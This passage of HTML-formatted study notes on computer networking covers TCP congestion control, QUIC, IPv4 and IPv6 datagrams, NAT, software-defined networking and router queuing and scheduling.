        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;AI/MD&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Additive Increase&lt;/em&gt;
&lt;ul&gt;
&lt;li&gt;increase &lt;code&gt;cwnd&lt;/code&gt; (congestion window) by 1 packet (increase data sent by the maximum segment size) on every RTT until loss is detected&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Multiplicative Decrease&lt;/em&gt;
&lt;ul&gt;
&lt;li&gt;cut sending rate in half at each loss event (e.g. triple duplicate ACK)&lt;/li&gt;
&lt;li&gt;sawtooth behaviour probing for bandwidth&lt;/li&gt;
&lt;li&gt;cut to 1 MSS (maximum segment size) when loss detected by timeout&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;congestion-information-via-network-assisted&#34; &gt;Congestion Information via Network-Assisted
&lt;span&gt;
    &lt;a href=&#34;#congestion-information-via-network-assisted&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Two bits in the TCP header indicating congestion (set by network operator at 80-85%)&lt;/p&gt;
&lt;h3 id=&#34;net-neutrality&#34; &gt;Net Neutrality
&lt;span&gt;
    &lt;a href=&#34;#net-neutrality&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;multimedia apps often do not use TCP&lt;/li&gt;
&lt;li&gt;there is no internet police policing use of congestion control&lt;/li&gt;
&lt;li&gt;web browsers and 9 existing connections
&lt;ul&gt;
&lt;li&gt;we want R / 2 instead of R / 10&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;tcp-cubic&#34; &gt;TCP CUBIC
&lt;span&gt;
    &lt;a href=&#34;#tcp-cubic&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Better way to probe than AIMD for usable bandwidth?&lt;/li&gt;
&lt;li&gt;K: point in time when TCP window size will reach W max&lt;/li&gt;
&lt;li&gt;K itself is tuneable&lt;/li&gt;
&lt;li&gt;Increase W (sending rate) as a function of the cube of the distance between current time and K&lt;/li&gt;
&lt;li&gt;Default in Linux&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;quic-quick-udp-internet-connections&#34; &gt;QUIC: Quick UDP Internet Connections
&lt;span&gt;
    &lt;a href=&#34;#quic-quick-udp-internet-connections&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Application-layer protocol on top of UDP&lt;/li&gt;
&lt;li&gt;Deployed on many Google servers and apps&lt;/li&gt;
&lt;li&gt;Increase performance of HTTP&lt;/li&gt;
&lt;li&gt;Combine TCP and TLS functionality into QUIC and combine with HTTP/2 slim to create HTTP 3&lt;/li&gt;
&lt;li&gt;error and congestion control&lt;/li&gt;
&lt;li&gt;streams parallel, no HOL (head-of-line) blocking&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;The most important difference in QUIC compared to HTTP/2 is that it&amp;rsquo;s UDP-based, with built-in encryption, and more performant. The aim of the protocol is to thwart TCP&amp;rsquo;s head-of-line blocking and higher latency. QUIC also allows multiplexing several application streams via a single connection.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;head-of-line-blocking&#34; &gt;Head-of-line Blocking
&lt;span&gt;
    &lt;a href=&#34;#head-of-line-blocking&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;If the head packet is lost, then all subsequent packets are blocked until the first packet in the sequence has been received. This is applicable to TCP and HTTP/2 (i.e. the streams). The subsequent packets are blocked because TCP ensures &lt;strong&gt;in-order&lt;/strong&gt; delivery via sequence numbers and acknowledgements.&lt;/p&gt;
&lt;h2 id=&#34;chapter-4--5-network-layer&#34; &gt;Chapter 4 &amp;amp; 5 Network Layer
&lt;span&gt;
    &lt;a href=&#34;#chapter-4--5-network-layer&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;Routing approaches, routing in the Internet, Internet Protocol, IPv6, tunnelling, router design, control/data plane, SDN.&lt;/p&gt;
&lt;h3 id=&#34;network-layer-services&#34; &gt;Network-layer Services
&lt;span&gt;
    &lt;a href=&#34;#network-layer-services&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;transport from sender to receiver&lt;/li&gt;
&lt;li&gt;sender
&lt;ul&gt;
&lt;li&gt;datagrams passed to link layer&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;receiver
&lt;ul&gt;
&lt;li&gt;segments to transport layer protocol&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;network layer implemented in every internet device&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;data-plane&#34; &gt;Data Plane
&lt;span&gt;
    &lt;a href=&#34;#data-plane&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Packet forwarding&lt;/p&gt;
&lt;h3 id=&#34;ipv4-datagram&#34; &gt;IPv4 Datagram
&lt;span&gt;
    &lt;a href=&#34;#ipv4-datagram&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Version (4-bits, v4 or v6), Header length, Type of service (e.g. FTP), datagram length&lt;/li&gt;
&lt;li&gt;16-bit ID, Flags, 13-bit Fragmentation offset
&lt;ul&gt;
&lt;li&gt;Networks links have MTU (maximum transmission unit), so a large IP datagram is fragmented and put back together.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;TTL, Upper-layer protocol, header checksum&lt;/li&gt;
&lt;li&gt;32-bit source&lt;/li&gt;
&lt;li&gt;32-bit destination&lt;/li&gt;
&lt;li&gt;options&lt;/li&gt;
&lt;li&gt;data&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;IPv4 is 32-bit so its address space was quickly used up.&lt;/p&gt;
&lt;p&gt;A datagram with 4000 bytes with an MTU of 1500 bytes. ID of all three fragmented datagram will be the same, and the fragment flag will be set for all but the last one. The offset field exists since there are headers of each of the smaller datagrams. 1480 bytes in data field. Therefore, offset = 1480/8. Offset is based on 8 bytes and is interpreted as how many bytes were sent in the other datagram. If datagrams are received out of order, can easily figure out what was missing.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;datagram #1: offset = 0, fragmentation flag&lt;/li&gt;
&lt;li&gt;datagram #2: offset = 1480/8, fragmentation flag&lt;/li&gt;
&lt;li&gt;datagram #3: offset = 2960/8, no fragmentation flag&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ip-addresses&#34; &gt;IP Addresses
&lt;span&gt;
    &lt;a href=&#34;#ip-addresses&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;192.168.2.0/24&lt;/li&gt;
&lt;li&gt;Each decimal number separated by decimal corresponds to 8 bits&lt;/li&gt;
&lt;li&gt;Therefore, the slash-24 corresponds to the rightmost 24 bits, or the rightmost 3 decimal numbers&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;nat&#34; &gt;NAT
&lt;span&gt;
    &lt;a href=&#34;#nat&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Network Address Translation&lt;/li&gt;
&lt;li&gt;Addresses IP address allocation (pun!)&lt;/li&gt;
&lt;li&gt;Many home networks with same address space (say 10.0.0.0/24) for private network usage&lt;/li&gt;
&lt;li&gt;A NAT-enabled router has a single IP address which appears as a device to the outside world&lt;/li&gt;
&lt;li&gt;The router gets its IP address from the ISP&amp;rsquo;s DHCP server!&lt;/li&gt;
&lt;li&gt;The router takes any connection which uses a device&amp;rsquo;s random port and assigns it a 16-bit port that the router finds in its NAT table of size 60,000&lt;/li&gt;
&lt;li&gt;Port-forwarding takes care of home servers&lt;/li&gt;
&lt;li&gt;P2P can leverage NAT traversal for when all nodes are NAT enabled (NAT = hard to accept incoming connections)&lt;/li&gt;
&lt;li&gt;IPv6 does not need NAT as there are enough unique addresses for all devices&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ipv6-datagram&#34; &gt;IPv6 Datagram
&lt;span&gt;
    &lt;a href=&#34;#ipv6-datagram&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;addressing expanded to 128-bits (every grain of sand on the planet) from 32-bits&lt;/li&gt;
&lt;li&gt;before unicast and multicast addresses.&lt;/li&gt;
&lt;li&gt;Now: anycast address, which is one from a group of hosts&lt;/li&gt;
&lt;li&gt;40-byte header&lt;/li&gt;
&lt;li&gt;TOS swapped out for traffic class&lt;/li&gt;
&lt;li&gt;Flow label: request special handling of certain types of datagrams (e.g. audio or video)&lt;/li&gt;
&lt;li&gt;Next header: replaces protocol field (TCP or UDP)&lt;/li&gt;
&lt;li&gt;Hop limit: same functionality as the TTL in IPv4&lt;/li&gt;
&lt;li&gt;No fragmentation/reassembly by intermediate routers. Source and Receivers are responsible. Routers will return &amp;ldquo;Packet Too Big&amp;rdquo; instead.&lt;/li&gt;
&lt;li&gt;No header checksum,&lt;/li&gt;
&lt;li&gt;No options (use next header instead)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;For the transition, tunneling (protocol 41, RFC 4213) is used (IPv6 datagram inside IPv4 data field).&lt;/p&gt;
&lt;h3 id=&#34;openflow-match-and-action&#34; &gt;OpenFlow Match and Action
&lt;span&gt;
    &lt;a href=&#34;#openflow-match-and-action&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Match
&lt;ul&gt;
&lt;li&gt;Physical (Ingress port)&lt;/li&gt;
&lt;li&gt;Link (MAC, Ethernet, Virtual LAN)&lt;/li&gt;
&lt;li&gt;Network (IPs, TOS, Protocol)&lt;/li&gt;
&lt;li&gt;Transport (TCP/UDP ports)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Action
&lt;ul&gt;
&lt;li&gt;forward to physical port or broadcast&lt;/li&gt;
&lt;li&gt;drop&lt;/li&gt;
&lt;li&gt;modify-field (packet header fields except IP Protocol field)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;control-plane&#34; &gt;Control Plane
&lt;span&gt;
    &lt;a href=&#34;#control-plane&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;whatever is configuring the router is in the control plane&lt;/li&gt;
&lt;li&gt;per-router control plane: routing algorithm runs in each router&lt;/li&gt;
&lt;li&gt;Software-defined networking: remote controller
&lt;ul&gt;
&lt;li&gt;Every router connected to remote controller server which will install forwarding tables in routers&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;network-service-model&#34; &gt;Network Service Model
&lt;span&gt;
    &lt;a href=&#34;#network-service-model&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h3 id=&#34;router-architecture&#34; &gt;Router Architecture
&lt;span&gt;
    &lt;a href=&#34;#router-architecture&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;input ports&lt;/li&gt;
&lt;li&gt;output ports&lt;/li&gt;
&lt;li&gt;high-speed switching fabric&lt;/li&gt;
&lt;li&gt;processor
&lt;ul&gt;
&lt;li&gt;need to route in milliseconds&lt;/li&gt;
&lt;li&gt;forwards data plane (nanosecond frame)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;input-port-functions&#34; &gt;Input Port Functions
&lt;span&gt;
    &lt;a href=&#34;#input-port-functions&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;Consult lookup table&lt;/li&gt;
&lt;li&gt;Queue if switch fabric too slow&lt;/li&gt;
&lt;li&gt;Head-of-the-line blocking can occur if switch fabric is busy with the port another input packet wants to go to (the packet afterwards wants to go to a currently free port)&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;longest-prefix-matching&#34; &gt;Longest Prefix Matching
&lt;span&gt;
    &lt;a href=&#34;#longest-prefix-matching&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;when looking at the forwarding table given a destination address, use longest address prefix that matches destination address&lt;/li&gt;
&lt;li&gt;1M routing table in Ternary Content Addressable Memories (TCAM)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;output-port-queuing&#34; &gt;Output Port Queuing
&lt;span&gt;
    &lt;a href=&#34;#output-port-queuing&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;switch fabric&lt;/li&gt;
&lt;li&gt;how much buffering?
&lt;ul&gt;
&lt;li&gt;tail drop: drop arriving packets&lt;/li&gt;
&lt;li&gt;priority: drop/remove on priority basis&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;packet-scheduling&#34; &gt;Packet Scheduling
&lt;span&gt;
    &lt;a href=&#34;#packet-scheduling&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;first come, first served&lt;/li&gt;
&lt;li&gt;priority&lt;/li&gt;
&lt;li&gt;round robin&lt;/li&gt;
&lt;li&gt;weighted fair queueing (WFQ)
&lt;ul&gt;
&lt;li&gt;each class has a weight and each cycle is divided by the weights&lt;/li&gt;
&lt;li&gt;weight x is 2, y is 1, and z is 1 then two packets from x, one form y, and one form z&lt;/li&gt;
&lt;li&gt;minimum bandwidth guarantee (per-traffic-class)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;subnets&#34; &gt;Subnets
&lt;span&gt;
    &lt;a href=&#34;#subnets&#34;&gt;
